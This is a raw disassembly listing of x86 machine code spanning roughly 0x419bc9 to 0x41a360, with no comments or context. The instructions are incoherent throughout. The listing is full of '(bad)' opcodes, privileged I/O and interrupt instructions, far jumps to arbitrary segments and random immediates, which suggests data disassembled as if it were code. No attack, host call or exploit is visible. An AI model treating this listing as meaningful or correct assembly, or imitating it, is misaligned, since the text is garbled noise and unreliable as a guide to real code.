  419bc9:	test   BYTE PTR [ebx+0x51d4dd6a],dh
  419bcf:	mov    cl,0xb4
  419bd1:	mov    ?,WORD PTR [esi]
  419bd3:	add    eax,DWORD PTR [edx]
  419bd5:	ins    DWORD PTR es:[edi],dx
  419bd6:	in     al,dx
  419bd7:	fldcw  WORD PTR [edi]
  419bd9:	xadd   BYTE PTR [ebp+0xcd191e0],dh
  419be0:	js     0x419c33
  419be2:	mov    dh,0xe5
  419be4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419be5:	fcomip st,st(7)
  419be7:	jg     0x419bff
  419be9:	add    al,0xdd
  419beb:	cdq    
  419bec:	jge    0x419ba0
  419bee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419bef:	scas   al,BYTE PTR es:[edi]
  419bf0:	(bad)  [edx-0x4a91dfa]
  419bf6:	pop    es
  419bf7:	adc    al,BYTE PTR [eax+0x66]
  419bfa:	cs fs test al,0x0
  419bfe:	jbe    0x419bc9
  419c00:	ror    DWORD PTR [edi+0x36132be4],0x74
  419c07:	ja     0x419c33
  419c09:	xchg   ebp,eax
  419c0a:	nop
  419c0b:	dec    ecx
  419c0c:	inc    edi
  419c0d:	mov    DWORD PTR [eax+edi*8+0x48],ebx
  419c11:	not    DWORD PTR [eax-0xf48e58b]
  419c17:	xchg   BYTE PTR [eax],ch
  419c19:	inc    edi
  419c1a:	pushf  
  419c1b:	adc    DWORD PTR [edx],ecx
  419c1d:	loopne 0x419bdb
  419c1f:	jge    0x419bc5
  419c21:	sub    BYTE PTR [esi+eiz*2-0x47],dl
  419c25:	mov    bh,bh
  419c27:	cmp    DWORD PTR [eax-0x1b1f15aa],ebx
  419c2d:	xor    al,0xde
  419c2f:	or     esi,edx
  419c31:	ja     0x419c0b
  419c33:	popa   
  419c34:	dec    ecx
  419c35:	jle    0x419bdd
  419c37:	jge    0x419c2a
  419c39:	ja     0x419bcb
  419c3b:	mov    ebx,0x44553699
  419c40:	cmc    
  419c41:	and    DWORD PTR [ecx+edx*1-0x17e4ef4c],edi
  419c48:	sub    al,0xf5
  419c4a:	or     al,0xcf
  419c4c:	sub    eax,0x9eb50e29
  419c51:	sbb    eax,0x42dfe186
  419c56:	push   esi
  419c57:	sbb    bl,ah
  419c59:	jne    0x419c3b
  419c5b:	sbb    eax,0x56b7e568
  419c60:	jb     0x419c87
  419c62:	fistp  WORD PTR [esp+edi*2]
  419c65:	sbb    esi,esi
  419c67:	cli    
  419c68:	rol    DWORD PTR [esi-0x22823778],1
  419c6e:	mov    ebp,0xb7550ee5
  419c73:	out    dx,al
  419c74:	fs (bad) 
  419c76:	ins    DWORD PTR es:[edi],dx
  419c77:	loope  0x419cee
  419c79:	aas    
  419c7a:	push   edi
  419c7b:	into   
  419c7c:	stc    
  419c7d:	test   DWORD PTR [ebp-0x2335016f],edi
  419c83:	adc    esp,edx
  419c85:	push   esi
  419c86:	dec    eax
  419c87:	clc    
  419c88:	inc    ebx
  419c89:	xor    bl,BYTE PTR [edx-0x25]
  419c8c:	xchg   DWORD PTR [eax+0x28],eax
  419c8f:	adc    al,0xa0
  419c91:	xor    eax,0x8b07dccd
  419c96:	imul   ebx,DWORD PTR [ebx-0x7b3ddd1d],0xad703f6e
  419ca0:	inc    ebp
  419ca1:	xchg   ebp,eax
  419ca2:	pop    es
  419ca3:	repz int3 
  419ca5:	test   DWORD PTR [eax],ebp
  419ca7:	aam    0xaf
  419ca9:	push   esp
  419caa:	das    
  419cab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419cac:	pop    edi
  419cad:	test   eax,0x74352f7d
  419cb2:	mov    gs,WORD PTR [edx-0x705d6a9e]
  419cb8:	xchg   edi,eax
  419cb9:	sar    BYTE PTR [ecx],1
  419cbb:	push   ss
  419cbc:	aam    0xda
  419cbe:	xor    dh,BYTE PTR [ebx]
  419cc0:	mov    esp,DWORD PTR [ebx+0x3f3c4b5c]
  419cc6:	jecxz  0x419cf6
  419cc8:	jo     0x419c60
  419cca:	mov    cx,0xd93d
  419cce:	push   ebp
  419ccf:	scas   al,BYTE PTR es:[edi]
  419cd0:	pop    esp
  419cd1:	into   
  419cd2:	lea    ecx,fs:[edx+0x33541272]
  419cd9:	xchg   edx,eax
  419cda:	xor    BYTE PTR [eax-0x6d198934],0xb5
  419ce1:	xor    edx,ebp
  419ce3:	mov    ch,0x84
  419ce5:	mov    esi,0xbd0d2a76
  419cea:	sub    bh,dh
  419cec:	adc    BYTE PTR [ecx+0x1e],cl
  419cef:	aas    
  419cf0:	int    0xe2
  419cf2:	(bad)  
  419cf3:	jb     0xf290afe9
  419cf9:	aam    0x4
  419cfb:	ror    edx,0x4c
  419cfe:	xor    BYTE PTR [ebp+0xd],dl
  419d01:	push   es
  419d02:	mov    eax,ds:0x13e25d52
  419d07:	(bad)  [edx-0x78]
  419d0a:	or     al,0xce
  419d0c:	repz pop esp
  419d0e:	adc    edi,ebx
  419d10:	inc    ebp
  419d11:	mov    dl,0x8c
  419d13:	test   DWORD PTR [esi-0x58],ebp
  419d16:	xor    DWORD PTR [ecx+0x59a2aadf],ebx
  419d1c:	test   DWORD PTR [esi+edi*4-0x1e],esi
  419d20:	jbe    0x419d37
  419d22:	push   es
  419d23:	das    
  419d24:	lock xlat BYTE PTR ds:[ebx]
  419d26:	aas    
  419d27:	adc    al,0x45
  419d29:	inc    eax
  419d2a:	stos   BYTE PTR es:[edi],al
  419d2b:	stc    
  419d2c:	adc    ebp,esp
  419d2e:	sbb    DWORD PTR [edi+0x6b],0xf1647694
  419d35:	mov    ch,0x44
  419d37:	fmul   st,st(3)
  419d39:	and    bh,BYTE PTR [ebx]
  419d3b:	mov    dh,0xd0
  419d3d:	pushf  
  419d3e:	cdq    
  419d3f:	js     0x419dab
  419d41:	jle    0x419d58
  419d43:	aam    0x94
  419d45:	daa    
  419d46:	sbb    dh,BYTE PTR [eax]
  419d48:	aam    0xc4
  419d4a:	pop    ebp
  419d4b:	mov    bl,0xe8
  419d4d:	sub    dl,BYTE PTR [ecx]
  419d4f:	es mov ah,0x20
  419d52:	ret    
  419d53:	(bad)  
  419d54:	mov    ch,0x1b
  419d56:	sbb    BYTE PTR [esi+0x54],dh
  419d59:	iret   
  419d5a:	fdivr  DWORD PTR [eax]
  419d5c:	popf   
  419d5d:	retf   
  419d5e:	cli    
  419d5f:	stc    
  419d60:	fucomip st,st(7)
  419d62:	adc    esp,DWORD PTR [eax-0x3d]
  419d65:	jmp    0x419dc0
  419d67:	or     bh,0x52
  419d6a:	aas    
  419d6b:	(bad)  
  419d6c:	sbb    esp,DWORD PTR [edi*4+0x62a6f53c]
  419d73:	cmp    eax,DWORD PTR [edx+0x3bd44897]
  419d79:	adc    dl,BYTE PTR [ebp+0x15]
  419d7c:	ja     0x419d3f
  419d7e:	inc    edi
  419d7f:	sbb    DWORD PTR [edi],0x352e560f
  419d85:	in     al,0xb7
  419d87:	bound  ebx,QWORD PTR [ebx+0xf]
  419d8a:	jg     0x419d6f
  419d8c:	div    DWORD PTR [esi-0x14dfbb94]
  419d92:	sub    cl,dl
  419d94:	push   edi
  419d95:	add    BYTE PTR ds:0xe57a25e0,ah
  419d9b:	mov    esi,0x1121add8
  419da0:	es xchg ebp,eax
  419da2:	inc    esi
  419da3:	in     al,0x20
  419da5:	sub    al,0xaa
  419da7:	adc    esi,0x6
  419daa:	inc    edi
  419dab:	pop    eax
  419dac:	js     0x419e1f
  419dae:	test   eax,0xf6fcc3fb
  419db3:	jae    0x419d3a
  419db5:	cmp    DWORD PTR [ebp+0x57fa8a6b],ecx
  419dbb:	fwait
  419dbc:	es inc esp
  419dbe:	jmp    0xcdd8:0x21e71467
  419dc5:	pusha  
  419dc6:	pop    esp
  419dc7:	sbb    al,0x84
  419dc9:	jmp    0x7d88:0x1008af27
  419dd0:	ss cli 
  419dd2:	test   al,0x4e
  419dd4:	sbb    DWORD PTR [ebp+0x2a],ecx
  419dd7:	push   cs
  419dd8:	in     al,dx
  419dd9:	rcl    DWORD PTR [esp+esi*4-0x5710678f],cl
  419de0:	jmp    0x12c:0x9f2e04db
  419de7:	sbb    edi,edi
  419de9:	stc    
  419dea:	scas   eax,DWORD PTR es:[edi]
  419deb:	pushf  
  419dec:	xchg   edi,eax
  419ded:	inc    esp
  419dee:	mov    bl,0x81
  419df0:	add    al,bl
  419df2:	sar    DWORD PTR [edi+ebx*2],0x1d
  419df6:	cmc    
  419df7:	cld    
  419df8:	or     bl,bh
  419dfa:	xchg   DWORD PTR [edx+0xc],edx
  419dfd:	outs   dx,BYTE PTR ds:[esi]
  419dfe:	mov    dh,0x4f
  419e00:	imul   ebp,edi,0xc8699dff
  419e06:	push   esp
  419e07:	adc    DWORD PTR [ebx],0xffffffdb
  419e0a:	cmp    DWORD PTR [edx],ebp
  419e0c:	mov    eax,ds:0xa6808055
  419e11:	or     BYTE PTR [edx],0x7c
  419e14:	loopne 0x419d9e
  419e16:	lods   al,BYTE PTR ds:[esi]
  419e17:	out    dx,al
  419e18:	add    BYTE PTR [ebp+ebp*8-0xaaf1183],ah
  419e1f:	inc    esp
  419e20:	mov    ch,0x64
  419e22:	stos   BYTE PTR es:[edi],al
  419e23:	fistp  DWORD PTR [esi]
  419e25:	in     eax,dx
  419e26:	add    eax,DWORD PTR [esp+ebp*4+0x677be575]
  419e2d:	xchg   esi,eax
  419e2e:	inc    eax
  419e2f:	sub    DWORD PTR [ebp+0x24],eax
  419e32:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419e33:	xchg   ebx,eax
  419e34:	xchg   ebx,eax
  419e35:	sahf   
  419e36:	mov    WORD PTR gs:[edi-0x28],es
  419e3a:	mov    esi,0x56644c32
  419e3f:	xchg   ecx,ebx
  419e41:	scas   eax,DWORD PTR es:[edi]
  419e42:	or     ecx,esi
  419e44:	je     0x419e85
  419e46:	jno    0x419e80
  419e48:	ss in  eax,0x5
  419e4b:	xchg   DWORD PTR [esp+ebx*2],edx
  419e4e:	push   esp
  419e4f:	shl    BYTE PTR [edx*1+0x642c9331],cl
  419e56:	push   edi
  419e57:	mov    fs,WORD PTR [edx+0x22]
  419e5a:	pop    ss
  419e5b:	pop    eax
  419e5c:	sahf   
  419e5d:	jg     0x419e49
  419e5f:	lock add DWORD PTR [ebp-0x3d],ecx
  419e63:	sub    DWORD PTR [ebx],ecx
  419e65:	hlt    
  419e66:	mov    ds:0x76e6dcd,eax
  419e6b:	xchg   bl,dh
  419e6d:	mov    ebx,0x786fb30a
  419e72:	loopne 0x419e75
  419e74:	out    0x6b,eax
  419e76:	stos   BYTE PTR es:[edi],al
  419e77:	jne    0x419e93
  419e79:	push   esi
  419e7a:	push   0x63399c78
  419e7f:	or     ecx,DWORD PTR [eax]
  419e81:	(bad)
  419e85:	leave  
  419e86:	iret   
  419e87:	and    ebp,DWORD PTR [edx+0x5dbc4908]
  419e8d:	sbb    al,0x9e
  419e8f:	call   0x82eba51d
  419e94:	loopne 0x419ebd
  419e96:	jl     0x419ea3
  419e98:	ret    
  419e99:	loop   0x419ef1
  419e9b:	pop    edi
  419e9c:	or     bl,BYTE PTR [esi+0xfd8687e]
  419ea2:	xor    DWORD PTR [esi-0x74a36733],esi
  419ea8:	pusha  
  419ea9:	imul   esi,DWORD PTR [edx+0x65aa0170],0xe0c249d6
  419eb3:	xor    eax,0xb76d344b
  419eb8:	test   al,0x11
  419eba:	inc    ebp
  419ebb:	jo     0x419e5e
  419ebd:	(bad)  
  419ebe:	push   edi
  419ebf:	jnp    0x419f1a
  419ec1:	mov    ah,0xcf
  419ec3:	lods   eax,DWORD PTR fs:[esi]
  419ec5:	mov    esi,0x44859f9
  419eca:	rol    DWORD PTR [eax],cl
  419ecc:	retf   
  419ecd:	xor    edi,DWORD PTR [edx+0x5ca117a3]
  419ed3:	sbb    edx,DWORD PTR [edi+0x16]
  419ed6:	mov    bh,0xff
  419ed8:	fistp  QWORD PTR [esi+0x67]
  419edb:	or     cl,BYTE PTR [esi+0x41]
  419ede:	and    edi,esp
  419ee0:	call   0x7010:0x346233fa
  419ee7:	dec    ecx
  419ee8:	mov    dh,0x6f
  419eea:	adc    al,0xff
  419eec:	mov    ebp,0xf10cb988
  419ef1:	mov    dh,0xcb
  419ef3:	or     DWORD PTR [ecx-0x76dc0b74],esi
  419ef9:	push   edx
  419efa:	aad    0x92
  419efc:	push   es
  419efd:	xchg   ecx,eax
  419efe:	pop    ebp
  419eff:	loope  0x419e85
  419f01:	push   edi
  419f02:	out    0x1f,eax
  419f04:	jne    0x419f11
  419f06:	pop    ds
  419f07:	fxtract 
  419f09:	out    dx,al
  419f0a:	sub    al,0x83
  419f0c:	stos   BYTE PTR es:[edi],al
  419f0d:	adc    DWORD PTR [esp+ebp*1],ebx
  419f10:	scas   al,BYTE PTR es:[edi]
  419f11:	stos   BYTE PTR es:[edi],al
  419f12:	cmp    BYTE PTR [esi-0x619c88e9],al
  419f18:	xchg   ebp,eax
  419f19:	push   ecx
  419f1a:	aam    0xb7
  419f1c:	repnz cmp al,0x3
  419f1f:	cmp    bh,ah
  419f21:	rcl    cl,0xa4
  419f24:	int3   
  419f25:	addr16 cwde 
  419f27:	add    ebx,ebx
  419f29:	bound  esp,QWORD PTR [eax-0x79]
  419f2c:	mov    al,BYTE PTR [edx+0x1643a317]
  419f32:	ins    DWORD PTR es:[edi],dx
  419f33:	lods   eax,DWORD PTR ds:[esi]
  419f34:	aam    0xa5
  419f36:	ret    
  419f37:	xchg   DWORD PTR [ebp-0x2e],esi
  419f3a:	lods   al,BYTE PTR ds:[esi]
  419f3b:	jl     0x419f8d
  419f3d:	add    DWORD PTR [ecx+0x9853fab],edi
  419f43:	dec    ecx
  419f44:	fiadd  DWORD PTR [ebp+edi*2-0x4107e76a]
  419f4b:	out    dx,al
  419f4c:	lds    ecx,FWORD PTR [esi-0xd0206cd]
  419f52:	jmp    0x8d8c:0x294a25bb
  419f59:	cwde   
  419f5a:	shl    BYTE PTR [edi],1
  419f5c:	mov    ds:0xd97eabda,al
  419f61:	and    edi,edi
  419f63:	sbb    eax,0x746ea997
  419f68:	sbb    eax,DWORD PTR [edx+0x63c8451a]
  419f6e:	add    al,0x94
  419f70:	aam    0xff
  419f72:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419f73:	jp     0x419f4f
  419f75:	clc    
  419f76:	add    ebp,DWORD PTR [esi-0x33a9f7b3]
  419f7c:	inc    ecx
  419f7d:	jbe    0x419f1f
  419f7f:	add    DWORD PTR ds:0x1d648db1,0xffffffda
  419f86:	ja     0x419fb7
  419f88:	inc    edi
  419f89:	scas   al,BYTE PTR es:[edi]
  419f8a:	cld    
  419f8b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419f8c:	push   ecx
  419f8d:	mov    esp,0x130c6d84
  419f92:	shl    BYTE PTR [eax-0x59459984],1
  419f98:	repnz and bl,BYTE PTR [edx]
  419f9b:	cld    
  419f9c:	pop    esi
  419f9d:	mov    ds:0x97481a63,eax
  419fa2:	dec    eax
  419fa3:	clc    
  419fa4:	cmp    eax,0xe661feb
  419fa9:	pop    edi
  419faa:	mov    edi,0xb5e5c56f
  419faf:	sub    BYTE PTR [edi-0x4f551caa],ch
  419fb5:	cmp    DWORD PTR [eax+0x4b4f07db],0xa9dd233b
  419fbf:	sbb    esi,DWORD PTR [eax-0x69]
  419fc2:	es inc eax
  419fc4:	mov    esp,0x8081e760
  419fc9:	dec    ebp
  419fca:	ror    BYTE PTR [ecx-0x3f51d79b],cl
  419fd0:	mov    ds:0xddf32bc4,eax
  419fd5:	mov    ecx,0x75d94479
  419fda:	sbb    eax,0xd164df5f
  419fdf:	imul   edx,DWORD PTR ds:0x26d8fe9c,0x46
  419fe6:	mov    dh,0x47
  419fe8:	clc    
  419fe9:	pop    edi
  419fea:	jo     0x419fab
  419fec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419fed:	mov    eax,ds:0xf0c1a935
  419ff2:	jg     0x41a000
  419ff4:	push   ecx
  419ff5:	add    edi,ebp
  419ff7:	(bad)  [ecx]
  419ff9:	scas   eax,DWORD PTR es:[edi]
  419ffa:	loope  0x41a00a
  419ffc:	mov    ch,0x9b
  419fff:	imul   ecx,DWORD PTR [edi+eax*4-0x5f],0x2bc1ead6
  41a007:	fsub   QWORD PTR [ebx]
  41a009:	out    0xf1,eax
  41a00b:	ins    BYTE PTR es:[edi],dx
  41a00c:	xor    ah,BYTE PTR [eax-0x79]
  41a00f:	pop    eax
  41a010:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a011:	shl    al,0xff
  41a014:	jg     0x419fb3
  41a016:	and    eax,0x3b7bf9de
  41a01b:	nop
  41a01c:	ja     0x419fb3
  41a01e:	or     DWORD PTR [eax],esp
  41a020:	and    BYTE PTR [edi+esi*1-0x1ddeadbe],al
  41a027:	push   es
  41a028:	inc    ebx
  41a029:	jns    0x41a094
  41a02b:	jl     0x41a043
  41a02d:	and    eax,DWORD PTR [ecx+eiz*2+0x0]
  41a031:	inc    esi
  41a032:	ja     0x41a073
  41a034:	int    0x65
  41a036:	mov    ds:0xae868cd8,al
  41a03b:	inc    ebp
  41a03c:	inc    edx
  41a03d:	repnz int3 
  41a03f:	sti    
  41a040:	fsub   DWORD PTR [edi-0x734f511d]
  41a046:	cdq    
  41a047:	fdiv   st,st(6)
  41a049:	adc    al,0xfa
  41a04b:	adc    DWORD PTR ds:0x2b36279a,ecx
  41a051:	repnz push eax
  41a053:	mov    ah,0xfd
  41a055:	ds dec ebx
  41a057:	sbb    eax,0xbdc1ebbd
  41a05c:	fs scas eax,DWORD PTR es:[edi]
  41a05e:	xlat   BYTE PTR ds:[ebx]
  41a05f:	pop    ebx
  41a060:	cmp    al,0x11
  41a062:	mov    BYTE PTR [edi],dh
  41a064:	cmc    
  41a065:	mov    dl,0x98
  41a067:	add    bh,0x5a
  41a06a:	cli    
  41a06b:	shl    dh,0x51
  41a06e:	(bad)  
  41a06f:	aad    0xa6
  41a071:	fsub   DWORD PTR [ecx+0x4c]
  41a074:	and    ebx,edi
  41a076:	(bad)  
  41a077:	clc    
  41a078:	dec    ebp
  41a079:	dec    edx
  41a07a:	call   0xe404:0x88c5b5cf
  41a081:	inc    edi
  41a082:	jns    0x41a00d
  41a084:	pop    es
  41a085:	jle    0x41a062
  41a087:	xor    eax,0x9b1e9d4a
  41a08c:	jge    0x41a103
  41a08e:	mov    al,BYTE PTR [edx-0x688ea0ab]
  41a094:	call   0x601a:0x80af3c0
  41a09b:	popa   
  41a09c:	mov    cs,WORD PTR [ebp+0x387a6d1b]
  41a0a2:	push   0xfffffff1
  41a0a4:	std    
  41a0a5:	pop    ebx
  41a0a6:	cmc    
  41a0a7:	push   ebp
  41a0a8:	shl    ch,cl
  41a0aa:	out    dx,al
  41a0ab:	add    eax,0xbbbd12de
  41a0b0:	fadd   QWORD PTR [eax+ebp*8]
  41a0b3:	add    ch,0x44
  41a0b6:	fst    QWORD PTR [ebp-0x2f6f8a77]
  41a0bc:	push   0x475c9f3d
  41a0c1:	rol    esp,1
  41a0c3:	mov    esp,0x1674e2e0
  41a0c8:	cmp    DWORD PTR [ecx+0x40],0xffffff8e
  41a0cc:	enter  0xd949,0x5f
  41a0d0:	test   al,0x70
  41a0d2:	out    0xb9,eax
  41a0d4:	mov    edx,0x4ef52118
  41a0d9:	data16 mov ds:0x9c2815e1,al
  41a0df:	dec    edx
  41a0e0:	mov    ecx,0x398a83f8
  41a0e5:	pop    ecx
  41a0e6:	adc    ebx,DWORD PTR [ebp-0x35]
  41a0e9:	xchg   BYTE PTR [esi-0x6],bh
  41a0ec:	jecxz  0x41a09f
  41a0ee:	adc    ebp,0xb8038638
  41a0f4:	adc    cl,BYTE PTR ds:0xb608e4a8
  41a0fa:	fcmovnb st,st(3)
  41a0fc:	jmp    0x41a159
  41a0fe:	fimul  WORD PTR [ebx+0x1bccc4ea]
  41a104:	or     ebp,DWORD PTR [ecx+0x4c]
  41a107:	mov    bl,0x19
  41a109:	aam    0xab
  41a10b:	test   DWORD PTR [esi+0x23],0xa93d8ab8
  41a112:	mov    dh,0x93
  41a114:	pop    es
  41a115:	xchg   BYTE PTR [edi],al
  41a117:	pop    edx
  41a118:	mov    ds:0xac0b87c8,eax
  41a11d:	and    ch,0x24
  41a120:	xor    bl,ch
  41a122:	outs   dx,BYTE PTR ds:[esi]
  41a123:	mov    DWORD PTR [edi-0x72996bd1],edi
  41a129:	shl    dh,0x92
  41a12c:	adc    dl,BYTE PTR [eax+0x27]
  41a12f:	shl    ebp,cl
  41a131:	cmp    ch,BYTE PTR [esi]
  41a133:	mov    bl,0xff
  41a135:	or     DWORD PTR [eax-0x56c35bf6],esi
  41a13b:	pop    ds
  41a13c:	xchg   ebp,eax
  41a13d:	lea    esp,[esp+esi*2-0x12c7dbcc]
  41a144:	iret   
  41a145:	xchg   esp,eax
  41a146:	mov    ds:0xf83ade5c,al
  41a14b:	push   ecx
  41a14c:	ins    BYTE PTR es:[edi],dx
  41a14d:	arpl   WORD PTR [esi],bp
  41a14f:	cmp    BYTE PTR [ebp-0x1f],0x97
  41a153:	(bad)
  41a157:	mov    ch,0x54
  41a159:	mov    ah,0x60
  41a15b:	xor    ch,ch
  41a15d:	test   BYTE PTR [esi+edi*4-0x5640fffa],cl
  41a164:	in     eax,0x5a
  41a166:	or     DWORD PTR [ecx+0x4f92a2ea],ecx
  41a16c:	inc    ecx
  41a16d:	iret   
  41a16e:	mov    esp,0xb4b9a476
  41a173:	pop    esp
  41a174:	dec    ecx
  41a175:	das    
  41a176:	cwde   
  41a177:	(bad)  
  41a178:	mov    edx,0xdcdbb8f5
  41a17d:	push   es
  41a17e:	stc    
  41a17f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a180:	lock cmp eax,0xd2427ec7
  41a186:	popa   
  41a187:	das    
  41a188:	jne    0x41a1e5
  41a18a:	mov    bh,0x82
  41a18c:	push   ebx
  41a18d:	or     ah,BYTE PTR [edx+edx*4]
  41a190:	xchg   DWORD PTR [ebp+0x21],ebx
  41a193:	jne    0x41a16d
  41a195:	jmp    0xec7:0xb07e41fb
  41a19c:	adc    dh,BYTE PTR ds:0xfca0cb1c
  41a1a2:	repnz xor cl,ah
  41a1a5:	stos   BYTE PTR es:[edi],al
  41a1a6:	sub    eax,ebp
  41a1a8:	sbb    cl,BYTE PTR [ecx-0x30]
  41a1ab:	andnps xmm6,xmm2
  41a1ae:	pop    ds
  41a1af:	adc    ah,BYTE PTR [edx]
  41a1b1:	xchg   esp,eax
  41a1b2:	jmp    0xe6b:0x1544e7b2
  41a1b9:	xor    DWORD PTR [edx],esi
  41a1bb:	loope  0x41a190
  41a1bd:	fstp   QWORD PTR [esi]
  41a1bf:	push   edx
  41a1c0:	xchg   DWORD PTR ds:0xab663290,esp
  41a1c6:	int    0x96
  41a1c8:	call   DWORD PTR [ebp-0x54fbdc23]
  41a1ce:	cmp    BYTE PTR [edi],al
  41a1d0:	xchg   esp,eax
  41a1d1:	imul   edi,DWORD PTR [ebx],0xffffffd6
  41a1d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a1d5:	push   es
  41a1d6:	mov    esp,0x4eb13480
  41a1db:	pusha  
  41a1dc:	mov    ch,0x88
  41a1de:	cmp    BYTE PTR [ebp+0x19],ah
  41a1e1:	clc    
  41a1e2:	test   eax,ebx
  41a1e4:	(bad)  
  41a1e5:	push   ds
  41a1e6:	nop
  41a1e7:	jo     0x41a1ac
  41a1e9:	clc    
  41a1ea:	jmp    0xbd0a24be
  41a1ef:	mov    cl,0xa1
  41a1f1:	xor    esi,DWORD PTR [ebx]
  41a1f3:	ins    BYTE PTR es:[edi],dx
  41a1f4:	mov    cl,BYTE PTR [ecx+ebp*4-0x74]
  41a1f8:	nop
  41a1f9:	mov    dl,0x1c
  41a1fb:	xor    eax,0x929dd1ba
  41a200:	or     DWORD PTR [edx],0x705572c4
  41a206:	test   DWORD PTR [edx-0x47],0x5675ea54
  41a20d:	inc    esi
  41a20e:	pusha  
  41a20f:	out    0xec,al
  41a211:	fadd   st(5),st
  41a213:	adc    ch,BYTE PTR [ebx]
  41a215:	out    dx,eax
  41a216:	xlat   BYTE PTR ds:[ebx]
  41a217:	add    ebx,DWORD PTR [esp+0x44]
  41a21b:	pop    es
  41a21c:	(bad)  
  41a21e:	xor    ebx,DWORD PTR [ebp-0x1]
  41a221:	pop    ss
  41a222:	or     edx,ebx
  41a224:	mov    ebp,0xafec240c
  41a229:	jo     0x41a252
  41a22b:	call   0x5cacfdf4
  41a230:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a231:	push   cs
  41a232:	(bad)  
  41a234:	imul   esp,DWORD PTR [edx-0x67],0x38
  41a238:	retf   
  41a239:	call   0xdb3:0xfbd51f64
  41a240:	test   eax,0xbc4da585
  41a245:	cdq    
  41a246:	(bad)  
  41a247:	shl    DWORD PTR [edx],1
  41a249:	and    al,0x89
  41a24b:	sbb    cl,BYTE PTR [ebp+0x7b27f5fc]
  41a251:	fisttp DWORD PTR [edx-0x44]
  41a254:	xor    al,BYTE PTR [esi+0x48f6f652]
  41a25a:	mov    edi,0xb191ae77
  41a25f:	push   ebp
  41a260:	jmp    0xbbdb:0x9c36f5db
  41a267:	in     al,dx
  41a268:	jg     0x41a1eb
  41a26a:	pop    ecx
  41a26b:	jo     0x41a24d
  41a26d:	xor    DWORD PTR [ecx-0x496c6bdb],0xc4938bfa
  41a277:	sub    bl,BYTE PTR [ebx+0x3a]
  41a27a:	aaa    
  41a27b:	push   edi
  41a27c:	pop    ebp
  41a27d:	xor    eax,0xde0f3691
  41a282:	shl    edx,cl
  41a284:	je     0x41a216
  41a286:	fsubr  st,st(1)
  41a288:	addr16 jno 0x41a2d6
  41a28b:	dec    ebx
  41a28c:	xor    ah,BYTE PTR [eax-0xcff462d]
  41a292:	sub    eax,0x7f620582
  41a297:	cdq    
  41a298:	inc    ecx
  41a299:	push   ss
  41a29a:	aad    0x34
  41a29c:	push   ecx
  41a29d:	mov    ah,0xd2
  41a29f:	mov    al,0x3b
  41a2a1:	push   cs
  41a2a2:	inc    edx
  41a2a3:	mov    eax,ds:0xaa1dd63
  41a2a8:	cmc    
  41a2a9:	adc    BYTE PTR [ebp-0x5d143208],0xa8
  41a2b0:	popf   
  41a2b1:	dec    esi
  41a2b2:	outs   dx,BYTE PTR ds:[esi]
  41a2b3:	cmp    eax,0xfaf566a6
  41a2b8:	ficomp WORD PTR [edx+ecx*8-0x16]
  41a2bc:	inc    ebp
  41a2bd:	cwde   
  41a2be:	faddp  st(4),st
  41a2c0:	fdivrp st(0),st
  41a2c2:	test   al,0xb2
  41a2c4:	pushf  
  41a2c5:	mov    ecx,0x82baf6db
  41a2ca:	aas    
  41a2cb:	push   ecx
  41a2cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a2cd:	popf   
  41a2ce:	dec    ecx
  41a2cf:	push   ecx
  41a2d0:	jecxz  0x41a2cf
  41a2d2:	or     edi,DWORD PTR [esi+edx*1]
  41a2d5:	sbb    esp,DWORD PTR [eax-0x20]
  41a2d8:	sub    edi,ebp
  41a2da:	lods   eax,DWORD PTR ds:[esi]
  41a2db:	into   
  41a2dc:	pop    ss
  41a2dd:	popa   
  41a2de:	jnp    0x41a280
  41a2e0:	repnz push esp
  41a2e2:	mov    esi,0x6b40f512
  41a2e7:	xchg   ecx,eax
  41a2e8:	push   esp
  41a2e9:	push   0xffffffea
  41a2eb:	daa    
  41a2ec:	sub    DWORD PTR [ebx-0x54],eax
  41a2ef:	pop    edx
  41a2f0:	js     0x41a2f7
  41a2f2:	cwde   
  41a2f3:	pop    ebx
  41a2f4:	or     al,0x22
  41a2f6:	dec    edx
  41a2f7:	jnp    0x41a342
  41a2f9:	mov    ds:0xfd9189bb,al
  41a2fe:	int3   
  41a2ff:	jae    0x41a301
  41a301:	out    0xaa,al
  41a303:	cmovp  esi,ebx
  41a306:	cmc    
  41a307:	xor    esi,DWORD PTR [ebx+0x55]
  41a30a:	jb     0x41a37b
  41a30c:	pop    ds
  41a30d:	hlt    
  41a30e:	popa   
  41a30f:	jns    0x41a36c
  41a311:	mov    eax,ds:0xaf7f27d3
  41a316:	(bad)  
  41a317:	sbb    esp,DWORD PTR [esi]
  41a319:	sbb    al,0xbe
  41a31b:	pop    edx
  41a31c:	add    al,0xd
  41a31e:	stos   DWORD PTR es:[edi],eax
  41a31f:	mov    al,ds:0x63583451
  41a324:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a325:	cmp    BYTE PTR [edi-0x53],dh
  41a328:	pop    edi
  41a329:	popf   
  41a32a:	push   ds
  41a32b:	dec    esi
  41a32c:	sbb    edx,DWORD PTR [ecx-0x5b]
  41a32f:	jne    0x41a349
  41a331:	jae    0x41a329
  41a333:	je     0x41a2ce
  41a335:	ds stc 
  41a337:	jno    0x41a2e7
  41a339:	stc    
  41a33a:	or     al,0x7c
  41a33c:	and    edi,esp
  41a33e:	adc    DWORD PTR [ebx+0x2e],ebx
  41a341:	sbb    BYTE PTR [edx-0x11],bh
  41a344:	ror    DWORD PTR [ebx+0x5e],cl
  41a347:	cwde   
  41a348:	mov    ah,0xe5
  41a34a:	mov    eax,ss:0xe1704a0e
  41a350:	pop    eax
  41a351:	nop
  41a352:	sub    al,0x1e
  41a354:	jp     0x41a2d7
  41a356:	or     esp,DWORD PTR [esp+eiz*2+0x43]
  41a35a:	clc    
  41a35b:	add    BYTE PTR [ebp+0x64],dl
  41a35e:	loopne 0x41a336
  41a360:	cs cmp al,0x68
